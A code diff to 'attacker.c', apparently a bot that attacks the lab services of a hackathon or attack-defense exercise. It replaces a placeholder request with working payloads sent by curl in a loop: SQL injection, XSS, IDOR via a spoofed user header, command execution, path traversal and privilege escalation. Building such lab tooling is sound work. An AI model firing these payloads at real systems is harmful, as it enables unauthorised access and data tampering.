@@ -6,25 +6,44 @@
 
 int main(void) {
     const char *target = getenv("MY_TARGET");
-    const char *secret = getenv("HACKATHON_SECRET");
     if (!target) target = "http://localhost:9100";
-    if (!secret) secret = "HACKATHON_SECRET_2025";
-
-    const char *vulns[] = {"sql_injection", "xss", "csrf", "rce", "auth_bypass"};
-    const char *services[] = {"web", "api", "file", "db"};
 
     srand((unsigned int)time(NULL));
     printf("[attacker.c] started\n");
 
     while (1) {
-        const char *v = vulns[rand() % 5];
-        const char *s = services[rand() % 4];
+        const char *s = "web";
+        char servicebuf[64];
+        FILE *p = popen("curl -s ${ORCH:-${ORCHESTRATOR_URL:-http://orchestrator:9000}}/current", "r");
+        if (p) {
+            char buf[1024];
+            size_t n = fread(buf, 1, sizeof(buf)-1, p);
+            buf[n] = '\0';
+            pclose(p);
+            if (strstr(buf, "\"active_service\":\"api\"")) s = "api";
+            else if (strstr(buf, "\"active_service\":\"file\"")) s = "file";
+            else if (strstr(buf, "\"active_service\":\"db\"")) s = "db";
+        }
         char cmd[1024];
-        snprintf(cmd, sizeof(cmd),
-            "curl -s -X POST %s/%s/attack -H 'Content-Type: application/json' -d '{\"vulnerability_type\":\"%s\",\"service\":\"%s\",\"secret\":\"%s\"}'",
-            target, s, v, s, secret);
+        if (strcmp(s, "web") == 0) {
+            snprintf(cmd, sizeof(cmd),
+                "curl -s -X POST %s/web/login -H 'Content-Type: application/json' -d '{\"username\":\"admin'' OR ''1''=''1\",\"password\":\"x\"}' >/dev/null; curl -s '%s/web/search?q=%%27%%20OR%%20%%271%%27%%3D%%271' >/dev/null; curl -s -X POST %s/web/comment -H 'Content-Type: application/json' -d '{\"comment\":\"<script>alert(1)</script>\"}' >/dev/null",
+                target, target, target);
+        } else if (strcmp(s, "api") == 0) {
+            snprintf(cmd, sizeof(cmd),
+                "curl -s %s/api/admin >/dev/null; curl -s %s/api/users/2 -H 'X-User-Id: 1' >/dev/null; curl -s -X POST %s/api/run -H 'Content-Type: application/json' -d '{\"cmd\":\"whoami\"}' >/dev/null",
+                target, target, target);
+        } else if (strcmp(s, "file") == 0) {
+            snprintf(cmd, sizeof(cmd),
+                "curl -s '%s/file/download?file=../files/sample.txt' >/dev/null",
+                target);
+        } else {
+            snprintf(cmd, sizeof(cmd),
+                "curl -s -X POST %s/db/query -H 'Content-Type: application/json' -d '{\"search\":\"'' OR ''1''=''1\"}' >/dev/null; curl -s -X POST %s/db/user/2/promote -H 'Content-Type: application/json' -d '{\"requester_id\":1}' >/dev/null",
+                target, target);
+        }
         int rc = system(cmd);
-        printf("attack %s/%s -> rc=%d\n", s, v, rc);
+        printf("attack %s -> rc=%d\n", s, rc);
         sleep(3);
     }
 
